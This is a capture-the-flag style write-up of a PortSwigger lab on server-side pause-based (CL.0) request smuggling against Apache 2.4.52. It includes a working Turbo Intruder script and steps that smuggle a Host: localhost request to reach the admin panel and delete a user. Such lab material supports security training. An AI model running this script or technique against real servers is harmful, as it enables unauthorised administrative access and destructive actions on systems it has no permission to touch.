# Lab 22 — Server-side pause-based request smuggling

> **Expert** · [Official lab](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling)

**Entry point:** Apache 2.4.52 — a **pause** mid-request makes it
mis-frame (CL.0) on redirecting endpoints.

## Solution

1. `Server: Apache 2.4.52`; `GET /resources` (no slash) redirects to
   `/resources/` — the desync vector.
2. Turbo Intruder: convert to `POST /resources` with a complete smuggled
   `GET /admin/` request in the body (`Connection: keep-alive`, correct
   CL), and use the pause script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False)
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

3. Launch — after 61s the second response is the smuggled `GET /admin/`
   (403 "local users only") → pause-based CL.0 confirmed.
4. Change the smuggled request's `Host: localhost`, relaunch — admin panel
   loads; note `/admin/delete` form details, adjust the smuggled request to
   delete carlos, relaunch — lab solved.

## Notes

A pause after the headers makes Apache treat the body as a new request —
"timeout-based" desyncs defeat CL validation entirely.
